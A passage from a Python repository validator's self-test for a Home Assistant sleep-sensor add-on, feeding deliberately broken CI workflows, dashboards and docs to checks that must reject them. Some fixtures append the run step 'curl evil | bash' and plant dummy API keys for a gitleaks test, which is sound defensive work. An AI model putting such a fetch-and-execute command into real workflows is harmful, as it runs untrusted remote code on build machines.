                        "printf 'api_key = \"x\"\\n' > .gitleaks-selftest/planted.txt\n"
                        "if gitleaks dir --no-banner --redact .; then\n"
                        "  echo not-detected\n"
                        "fi\n"
                        "rm -rf .gitleaks-selftest\n"
                        "printf 'api_key = \"x\"\\n' "
                        "> .gstack/gitleaks-generated-state-self-test.json\n"
                        "gitleaks dir --no-banner --redact .\n",
                    ),
                )
            ),
        )
        # Substring matching accepted this: the bare exclusion scan is a
        # substring of the `if` line and the .gstack path appears in the trap
        # line, so deleting the entire exclusion control still passed.
        expect_fail(
            "workflow gitleaks config self-test missing exclusion control",
            lambda: validate_workflow(
                workflow_with(
                    "security",
                    lambda steps: set_step_run(
                        steps,
                        "Self-test repo config detects and excludes correctly",
                        "trap 'rm -rf .gitleaks-selftest "
                        ".gstack/gitleaks-generated-state-self-test.json' EXIT\n"
                        "mkdir -p .gitleaks-selftest\n"
                        "printf 'api_key = \"x\"\\n' > .gitleaks-selftest/planted.txt\n"
                        "if gitleaks dir --no-banner --redact .; then\n"
                        "  echo not-detected >&2\n"
                        "  exit 1\n"
                        "fi\n",
                    ),
                )
            ),
        )
        # Presence is order-independent: hoisting the exclusion scan above the
        # .gstack plant leaves every marker present while that scan runs on a
        # clean tree and proves nothing.
        expect_fail(
            "workflow gitleaks config self-test controls out of order",
            lambda: validate_workflow(
                workflow_with(
                    "security",
                    lambda steps: set_step_run(
                        steps,
                        "Self-test repo config detects and excludes correctly",
                        "trap 'rm -rf .gitleaks-selftest "
                        ".gstack/gitleaks-generated-state-self-test.json' EXIT\n"
                        "mkdir -p .gitleaks-selftest .gstack\n"
                        "gitleaks dir --no-banner --redact .\n"
                        "printf 'api_key = \"x\"\\n' "
                        "> .gstack/gitleaks-generated-state-self-test.json\n"
                        "printf 'api_key = \"x\"\\n' > .gitleaks-selftest/planted.txt\n"
                        "if gitleaks dir --no-banner --redact .; then\n"
                        "  exit 1\n"
                        "fi\n",
                    ),
                )
            ),
        )
        # A no-op `trap '' EXIT` satisfies a bare `trap ` prefix check while
        # leaving both planted secrets in the workspace.
        expect_fail(
            "workflow gitleaks config self-test no-op trap",
            lambda: validate_workflow(
                workflow_with(
                    "security",
                    lambda steps: set_step_run(
                        steps,
                        "Self-test repo config detects and excludes correctly",
                        "trap '' EXIT\n"
                        "mkdir -p .gitleaks-selftest .gstack\n"
                        "printf 'api_key = \"x\"\\n' > .gitleaks-selftest/planted.txt\n"
                        "if gitleaks dir --no-banner --redact .; then\n"
                        "  exit 1\n"
                        "fi\n"
                        "printf 'api_key = \"x\"\\n' "
                        "> .gstack/gitleaks-generated-state-self-test.json\n"
                        "gitleaks dir --no-banner --redact .\n",
                    ),
                )
            ),
        )
        # Markers inside `#` comments prove nothing: the step would execute no
        # control at all while every required fragment still matched.
        expect_fail(
            "workflow gitleaks config self-test commented out",
            lambda: validate_workflow(
                workflow_with(
                    "security",
                    lambda steps: set_step_run(
                        steps,
                        "Self-test repo config detects and excludes correctly",
                        "# trap 'rm -rf .gitleaks-selftest' EXIT\n"
                        "# printf 'api_key' > .gitleaks-selftest/planted.txt\n"
                        "# if gitleaks dir --no-banner --redact .; then\n"
                        "# exit 1\n"
                        "# printf 'api_key' "
                        "> .gstack/gitleaks-generated-state-self-test.json\n"
                        "# gitleaks dir --no-banner --redact .\n"
                        "true\n",
                    ),
                )
            ),
        )
        # Same hazard on the whitespace support step, the only other step
        # matched against comment-stripped command lines. Other content-checked
        # steps still use raw substring matching — tracked in TODOS.md.
        expect_fail(
            "workflow whitespace check commented out",
            lambda: validate_workflow(
                workflow_with(
                    "validate",
                    lambda steps: set_step_run(
                        steps,
                        "Check whitespace",
                        '# git diff --check "$BASE_SHA...$HEAD_SHA"\n'
                        "# git diff --check\n"
                        "true\n",
                    ),
                )
            ),
        )
        # `\s` matched newlines, so a block scalar split across lines satisfied
        # the "fully anchored" gate pattern while the shell ran two commands.
        expect_fail(
            "workflow gate split across lines",
            lambda: validate_workflow(
                workflow_with(
                    "validate",
                    lambda steps: set_step_run(
                        steps,
                        "Check Python syntax",
                        "python -m py_compile "
                        "aqara_fp2_sleep/aqara_fp2_sleep_poller.py "
                        "scripts/validate_repository.py "
                        "videos/quiet_proof_loops.py "
                        "videos/validate-gif-batch.py\n"
                        "videos/build-gif-deliverables.py\n",
                    ),
                )
            ),
        )
        # BASE_SHA/HEAD_SHA come from the workflow env, not the shell: without
        # them the range compare expands to `git diff --check "..."` and checks
        # nothing, while the executed command line still matches every guard.
        expect_fail(
            "workflow whitespace step without BASE_SHA/HEAD_SHA env",
            lambda: validate_workflow(
                workflow_with(
                    "validate",
                    lambda steps: set_step_env(steps, "Check whitespace", {}),
                )
            ),
        )
        expect_fail_matching(
            "workflow whitespace step with static refs",
            lambda: validate_workflow(
                workflow_with(
                    "validate",
                    lambda steps: set_step_env(
                        steps,
                        "Check whitespace",
                        {"BASE_SHA": "HEAD", "HEAD_SHA": "HEAD"},
                    ),
                )
            ),
            "derive BASE_SHA from the GitHub event",
        )
        # YAML types `on`, `yes` and `off` as bools, all legal GitHub job ids.
        # Sorting a mixed-type set must report the actionable failure rather
        # than raising TypeError out of sorted().
        mixed_jobs = copy.deepcopy(base_jobs)
        mixed_jobs[True] = {"runs-on": "ubuntu-latest", "steps": []}
        mixed_jobs["deploy"] = {"runs-on": "ubuntu-latest", "steps": []}
        expect_fail(
            "workflow extra job ids of mixed YAML types",
            lambda: validate_workflow(mixed_jobs),
        )
        # Same hazard one level down, on the duplicate-step-name report.
        expect_fail(
            "workflow duplicate step names of mixed YAML types",
            lambda: validate_workflow(
                workflow_with(
                    "security",
                    lambda steps: steps
                    + [
                        {"name": True, "run": "true"},
                        {"name": True, "run": "true"},
                        {"name": "Sneaky", "run": "true"},
                        {"name": "Sneaky", "run": "true"},
                    ],
                )
            ),
        )
        # A job entry that is not a mapping must fail closed rather than
        # raising AttributeError out of job_steps().
        expect_fail(
            "workflow job entry not a mapping",
            lambda: validate_workflow(
                dict(copy.deepcopy(base_jobs), security="nope")
            ),
        )
        # An unnamed run: step cannot be inspected by any name-keyed check, so
        # it must be rejected with its own diagnostic. The membership check
        # rejects it too (None is never a known name), so the message has to be
        # asserted — otherwise this fixture passes on the wrong guard.
        expect_fail_matching(
            "workflow unnamed run step",
            lambda: validate_workflow(
                workflow_with(
                    "security",
                    lambda steps: steps + [{"run": "curl evil | bash"}],
                )
            ),
            "unnamed step",
        )
        for malformed_name in ([], {}):
            expect_fail_matching(
                f"workflow malformed run step name {type(malformed_name).__name__}",
                lambda malformed_name=malformed_name: validate_workflow(
                    workflow_with(
                        "security",
                        lambda steps: steps
                        + [{"name": malformed_name, "run": "curl evil | bash"}],
                    )
                ),
                "step name must be a non-empty string",
            )
        # PyYAML types `run: on` as True; GitHub Actions still runs it, so an
        # isinstance(str) gate would skip every check for that step.
        expect_fail(
            "workflow non-string run scalar",
            lambda: validate_workflow(
                workflow_with(
                    "security",
                    lambda steps: steps + [{"name": "Sneaky", "run": True}],
                )
            ),
        )
        # A missing required job must be a ValidationError, not a raw KeyError
        # out of job_steps() — expect_fail() only catches the former, so the
        # crash would abort the whole self-test instead of being recorded.
        expect_fail(
            "workflow missing required job",
            lambda: validate_workflow(
                {
                    name: copy.deepcopy(job)
                    for name, job in base_jobs.items()
                    if name != "security"
                }
            ),
        )

    if base_jobs is not None:
        workflow_fixtures(base_jobs)
    expect_fail(
        "conductor settings gate order swapped",
        lambda: validate_conductor_settings(
            f"[scripts]\nrun = {json.dumps(' && '.join(reordered))}\n"
        ),
    )
    # A duplicated gate (every required command present, but one repeated)
    # must still fail: set-membership-only missing/unexpected checks would
    # find nothing on either side and misdiagnose this as "order differs".
    duplicated = list(CONDUCTOR_REQUIRED_COMMANDS) + [CONDUCTOR_REQUIRED_COMMANDS[0]]
    expect_fail(
        "conductor settings duplicated gate",
        lambda: validate_conductor_settings(
            f"[scripts]\nrun = {json.dumps(' && '.join(duplicated))}\n"
        ),
    )

    expect_fail(
        "addon config boolean watchdog",
        lambda: validate_addon_config(dict(addon_config, watchdog=True)),
    )
    expect_fail(
        "tracked render artifact",
        lambda: validate_tracked_paths(
            published_paths + ["videos/example/renders/proof.jpg"]
        ),
    )
    expect_fail(
        "tracked snapshot artifact",
        lambda: validate_tracked_paths(
            published_paths + ["videos/example/snapshots/frame.png"]
        ),
    )
    expect_fail(
        "tracked verification receipt",
        lambda: validate_tracked_paths(
            published_paths + ["videos/example/VERIFICATION.md"]
        ),
    )
    expect_fail(
        "tracked batch verification",
        lambda: validate_tracked_paths(
            published_paths + ["videos/gif-batch-verification.json"]
        ),
    )
    expect_fail(
        "tracked DS Store",
        lambda: validate_tracked_paths(published_paths + ["videos/example/.DS_Store"]),
    )
    expect_fail(
        "tracked generated .gstack state",
        lambda: validate_tracked_paths(
            published_paths + [".gstack/generated-state.json"]
        ),
    )
    expect_fail(
        "tracked media outside published assets",
        lambda: validate_tracked_paths(published_paths + ["docs/example.gif"]),
    )
    expect_fail(
        "published GIF missing MP4",
        lambda: validate_tracked_paths(
            [
                "assets/feature-gifs/example.gif",
                "videos/example/index.html",
            ]
        ),
    )
    expect_fail(
        "published MP4 missing GIF",
        lambda: validate_tracked_paths(
            [
                "assets/feature-gifs/example.mp4",
                "videos/example/index.html",
            ]
        ),
    )
    expect_fail(
        "published pair missing source",
        lambda: validate_tracked_paths(
            [
                "assets/feature-gifs/example.gif",
                "assets/feature-gifs/example.mp4",
            ]
        ),
    )
    expect_fail(
        "addon config non-URL watchdog",
        lambda: validate_addon_config(dict(addon_config, watchdog="true")),
    )
    expect_fail(
        "conductor settings missing published baseline",
        lambda: validate_conductor_settings(
            mutate(
                conductor_settings,
                f" && {CONDUCTOR_BASELINE_COMMAND}",
                "",
            )
        ),
    )
    expect_fail(
        "conductor settings unreachable after early exit",
        lambda: validate_conductor_settings(
            mutate(
                conductor_settings,
                'run = "git diff --check',
                'run = "exit 0 && git diff --check',
            )
        ),
    )
    expect_fail(
        "favicon drift",
        lambda: check_favicon(favicon_source, favicon.replace(b"#5aa2ff", b"#ffffff")),
    )
    external_favicon = (
        b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 128 128">'
        b'<image href="https://example.com/logo.png" /></svg>'
    )
    expect_fail(
        "favicon external asset",
        lambda: check_favicon(external_favicon, external_favicon),
    )
    expect_fail(
        "run script direct exit",
        lambda: validate_run_script(
            mutate(
                run_script,
                'startup_failure "aqara_username and aqara_password are required."',
                'bashio::exit.nok "aqara_username and aqara_password are required."',
            )
        ),
    )
    expect_fail(
        "run script non-interruptible cooldown",
        lambda: validate_run_script(
            mutate(
                run_script,
                "trap 'kill \"${sleep_pid}\" 2>/dev/null' TERM INT",
                "",
            )
        ),
    )
    expect_fail(
        "run script cooldown env drift",
        lambda: validate_run_script(
            mutate(
                run_script,
                'export STARTUP_FAILURE_COOLDOWN="${STARTUP_FAILURE_COOLDOWN:-30}"',
                'export STARTUP_FAILURE_COOLDOWN="${STARTUP_FAILURE_COOLDOWN:-60}"',
            )
        ),
    )
    expect_fail(
        "card PHASES label",
        lambda: check_card_phase_semantics(mutate(card, '3: "REM"', '3: "Deep sleep"')),
    )
    expect_fail(
        "card in-bed set",
        lambda: check_card_phase_semantics(
            mutate(card, "new Set([1, 2, 3, 4, 5])", "new Set([2, 3, 4, 5])")
        ),
    )
    expect_fail(
        "card occupied code 0 contract",
        lambda: check_card_phase_semantics(
            mutate(
                card,
                'if (occupancyConfirmed && code === 0) return "In bed";',
                'if (occupancyConfirmed && code === 0) return "Out of bed";',
            )
        ),
    )
    expect_fail(
        "card occupied codes 1/2 contract",
        lambda: check_card_phase_semantics(
            mutate(
                card,
                'return "In bed — stage unknown";',
                'return "Awake";',
            )
        ),
    )
    expect_fail(
        "card direct gate self-reference",
        lambda: check_card_phase_semantics(
            mutate(
                card,
                "if (Object.values(this._entityIds).includes(entity))",
                "if (false)",
            )
        ),
    )
    expect_fail(
        "card non-string override rejection",
        lambda: check_card_phase_semantics(
            mutate(card, 'if (typeof override !== "string")', "if (false)")
        ),
    )
    expect_fail(
        "card occupied_states both binary states",
        lambda: check_card_phase_semantics(
            mutate(
                card,
                'normalizedStates.includes("on") && normalizedStates.includes("off")',
                "false",
            )
        ),
    )
    # The bypass this guard was blind to: gut the real logic, then re-introduce
    # every expected fragment inside comments. Before comment-stripping this
    # mutation PASSED, so the contract could be deleted with CI green.
    expect_fail(
        "card contract fragments hidden in comments",
        lambda: check_card_phase_semantics(
            '// if (occupancyConfirmed && code === 0) return "In bed";\n'
            '// return "In bed — stage unknown";\n'
            "// if (Object.values(this._entityIds).includes(entity))\n"
            '// if (typeof override !== "string")\n'
            '// normalizedStates.includes("on") && normalizedStates.includes("off")\n'
            '/* if (occupancyConfirmed && code === 0) return "In bed"; */\n'
            + mutate(
                mutate(
                    card,
                    'if (occupancyConfirmed && code === 0) return "In bed";',
                    'if (false) return "nope";',
                ),
                "if (Object.values(this._entityIds).includes(entity))",
                "if (false)",
            )
        ),
    )
    expect_fail(
        "readme gated label",
        lambda: check_readme_phase_table(
            mutate(readme, "| `3` | REM | REM |", "| `3` | REM | Light sleep |")
        ),
    )
    expect_fail(
        "readme legacy label",
        lambda: check_readme_phase_table(
            mutate(readme, "| `3` | REM | REM |", "| `3` | Light sleep | REM |")
        ),
    )
    expect_fail(
        "readme phase table loses a column",
        lambda: check_readme_phase_table(
            mutate(readme, "| `3` | REM | REM |", "| `3` | REM |")
        ),
    )
    expect_fail(
        "sleep_tracking phases label",
        lambda: check_sleep_tracking_maps(
            mutate(
                tracking,
                "3: 'REM (indicative)'",
                "3: 'Deep sleep (indicative)'",
            )
        ),
    )
    expect_fail(
        "sleep_tracking asleep occupancy gate",
        lambda: check_sleep_tracking_maps(
            mutate(
                tracking,
                "occupancy == 'on' and code in [3, 4, 5]",
                "code in [3, 4, 5]",
            )
        ),
    )
    expect_fail(
        "sleep_tracking asleep list",
        lambda: check_sleep_tracking_maps(
            mutate(tracking, "code in [3, 4, 5]", "code in [4, 5]")
        ),
    )
    expect_fail(
        "sleep_tracking fail-closed availability",
        lambda: check_sleep_tracking_maps(
            mutate(
                tracking,
                "occupancy in ['on', 'off']",
                "occupancy != 'unknown'",
            )
        ),
    )
    expect_fail(
        "sleep_tracking fail-open or true",
        lambda: check_sleep_tracking_maps(
            mutate(
                tracking,
                "occupancy == 'on' and code in [3, 4, 5]",
                "occupancy == 'on' and code in [3, 4, 5] or true",
            )
        ),
    )
    expect_fail(
        "sleep_tracking fail-open availability or",
        lambda: check_sleep_tracking_maps(
            mutate(
                tracking,
                "{{ occupancy in ['on', 'off']\n           and (occupancy == 'off'",
                "{{ occupancy in ['on', 'off']\n           or (occupancy == 'off'",
            )
        ),
    )
    expect_fail(
        "dashboard live card",
        lambda: check_dashboard_maps(
            mutate(
                dashboard,
                "type: custom:sleepradar-card",
                "type: custom:mushroom-template-card",
            )
        ),
    )
    expect_fail(
        "dashboard non-list root",
        lambda: check_dashboard_maps(yaml.safe_dump({"title": "Sleep"})),
    )
    expect_fail(
        "dashboard duplicate Now section",
        lambda: check_dashboard_maps(dashboard_with_duplicate_now_section()),
    )
    expect_fail(
        "dashboard duplicate live card",
        lambda: check_dashboard_maps(dashboard_with_duplicate_live_card()),
    )
    expect_fail(
        "dashboard occupancy gate",
        lambda: check_dashboard_maps(
            mutate(
                dashboard,
                "entity: binary_sensor.bed_occupied",
                "entity: binary_sensor.other_occupancy",
            )
        ),
    )
    expect_fail(
        "dashboard apex label",
        lambda: check_dashboard_maps(
            mutate(
                dashboard,
                '4: "Light (indicative)"',
                '4: "Napping (indicative)"',
            )
        ),
    )
    expect_fail(
        "dashboard unverified-code gap",
        lambda: check_dashboard_maps(
            mutate(
                dashboard,
                "Number(x) < 3",
                "Number(x) < 2",
            )
        ),
    )
    expect_fail(
        "automation indicative stage",
        lambda: check_automation_gates(
            mutate(
                automations,
                'to: "Deep sleep (indicative)"',
                'to: "Deep sleep"',
            )
        ),
    )
    expect_fail(
        "examples readme occupancy dependency",
        lambda: check_examples_readme_gate_contract(
            mutate(
                examples_readme,
                OCCUPANCY_ENTITY,
                "binary_sensor.optional_occupancy",
            )
        ),
    )
    expect_fail(
        "ghost-vitals aggregate drift",
        lambda: check_ghost_vitals_evidence(
            mutate(
                ghost_vitals_fixture,
                '"update_events": 301',
                '"update_events": 302',
            ),
            readme,
        ),
    )
    expect_fail(
        "ghost-vitals privacy drift",
        lambda: check_ghost_vitals_evidence(
            mutate(
                ghost_vitals_fixture,
                '"source_kind": "independent_binary_sensor"',
                '"source_kind": "sensor.bedroom_bed_status"',
            ),
            readme,
        ),
    )
    expect_fail(
        "ghost-vitals timestamp drift",
        lambda: check_ghost_vitals_evidence(
            mutate(
                ghost_vitals_fixture,
                '"absolute_timestamps_included": false',
                '"absolute_timestamps_included": true',
            ),
            readme,
        ),
    )
    expect_fail(
        "ghost-vitals README provenance drift",
        lambda: check_ghost_vitals_evidence(
            ghost_vitals_fixture,
            mutate(readme, GHOST_VITALS_FIXTURE, "tests/fixtures/missing.json"),
        ),
    )
    expect_fail(
        "ghost-vitals malformed JSON",
        lambda: check_ghost_vitals_evidence("{not json", readme),
    )
    expect_fail(
        "ghost-vitals non-object root",
        lambda: check_ghost_vitals_evidence("[]", readme),
    )
    for label, old, new in [
        ("schema version", '"schema_version": 1', '"schema_version": 2'),
        (
            "evidence kind",
            '"evidence_kind": "sanitized_aggregate"',
            '"evidence_kind": "raw_export"',
        ),
        (
            "stage interpretation",
            '"interpretation": "indicative_only"',
            '"interpretation": "verified_stages"',
        ),
        (
            "code sequence",
            '"reported_codes": [\n      4,\n      5,\n      3\n    ]',
            '"reported_codes": [\n      3,\n      4,\n      5\n    ]',
        ),
        (
            "recorder note",
            "The source uses force_update, so Recorder can contain repeated",
            "The source emits duplicate rows, so Recorder can contain repeated",
        ),
        (
            "occupancy aggregate",
            '"continuous_state": "empty"',
            '"continuous_state": "occupied"',
        ),
    ]:
        expect_fail(
            f"ghost-vitals {label} drift",
            lambda old=old, new=new: check_ghost_vitals_evidence(
                mutate(ghost_vitals_fixture, old, new), readme
            ),
        )
    for label, old, new in [
        ("independence", "not be derived from", "not be sourced from"),
        ("fail-closed wording", "fail closed", "stay available"),
        (
            "codes 0-2 guarantee",
            "never assert an in-bed stage",
            "may assert an in-bed stage",
        ),
        (
            "codes 3-5 indicative",
            "codes 3–5 are indicative",
            "codes 3–5 are verified",
        ),
        ("vitals provenance", "sensor-reported.", "device-measured."),
    ]:
        expect_fail(
            f"examples readme {label}",
            lambda old=old, new=new: check_examples_readme_gate_contract(
                mutate(examples_readme, old, new)
            ),
        )
    expect_fail(
        "automations non-list root",
        lambda: check_automation_gates(yaml.safe_dump({"alias": "Cool down"})),
    )
    expect_fail(
        "automations empty list",
        lambda: check_automation_gates("[]"),
    )
    expect_fail(
        "automations entry not a mapping",
        lambda: check_automation_gates(yaml.safe_dump(["Cool down"])),
    )
    expect_fail(
        "automations ungated helper",
        lambda: check_automation_gates(
            mutate(automations, "binary_sensor.fp2_asleep", "binary_sensor.some_helper")
        ),
    )
    expect_fail(
        "automations phase occupancy condition",
        lambda: check_automation_gates(
            mutate(automations, OCCUPANCY_ENTITY, "binary_sensor.derived_occupancy")
        ),
    )
    expect_fail(
        "dashboard gate occupied states",
        lambda: check_dashboard_maps(
            mutate(
                dashboard, "occupied_states: ['on']", "occupied_states: ['on', 'off']"
            )
        ),
    )
    expect_fail(
        "dashboard missing Now section",
        lambda: check_dashboard_maps(
            mutate(dashboard, "heading: Now", "heading: Later")
        ),
    )
    expect_fail(
        "sleep_tracking non-list root",
        lambda: check_sleep_tracking_maps(
            "template: |\n"
            "  phases = {3: 'REM (indicative)', 4: 'Light sleep (indicative)', "
            "5: 'Deep sleep (indicative)'}\n"
            "  names = {3: 'REM (indicative)', 4: 'Light sleep (indicative)', "
            "5: 'Deep sleep (indicative)'}\n"
        ),
    )
    expect_fail(
        "sleep_tracking missing template entries",
        lambda: check_sleep_tracking_maps(
            mutate(tracking, 'name: "FP2 Asleep"', 'name: "FP2 Sleeping"')
        ),
    )
    expect_fail(
        "recorder entity",
        lambda: check_recorder_entities(
            mutate(
                recorder,
                "sensor.aqara_fp2_sleep_heart_rate",
                "sensor.aqara_fp2_sleep_pulse",
            ),
            entity_ids,
            diagnostic_entity_id,
        ),
    )
    expect_fail_matching(
        "recorder dropping the diagnostic entity",
        lambda: check_recorder_entities(
            mutate(recorder, f"    - {diagnostic_entity_id}\n", ""),
            entity_ids,
            diagnostic_entity_id,
        ),
        "connection_problem",
    )

    if failures:
        print("VALIDATOR SELF-TEST FAILED:")
        for line in failures:
            print(f"  - {line}")
        sys.exit(1)
    print("SleepRadar validator self-test OK")


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    # allow_abbrev=False: with argparse's default, `--self` and even `--s`
    # resolve to --self-test, so a typo would silently run the drift self-test
    # and exit 0 while the caller believed package validation had run.
    parser = argparse.ArgumentParser(description=__doc__, allow_abbrev=False)
    parser.add_argument(
        "--self-test",
        action="store_true",
        help="run validator drift checks instead of repository validation",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> None:
    args = parse_args(argv)
    if args.self_test:
        run_self_test()
        return
    validate_requirements()
    validate_dockerfile()
    validate_workflow()
    validate_conductor_settings()
    validate_tracked_paths()
    validate_yaml()
    validate_favicon()
    validate_addon_config()
    check_addon_permissions()
    check_failure_classification()
    check_problem_entity_is_independent()
    check_health_grace_and_notifications()
    check_auth_backoff_schedule()
    check_notification_failure_is_soft()
    validate_run_script()
    validate_examples()
    validate_discovery_payloads()
    validate_phase_semantics()
    validate_ghost_vitals_evidence()
    scan_private_strings()
    print("SleepRadar package validation OK")


if __name__ == "__main__":
    main()
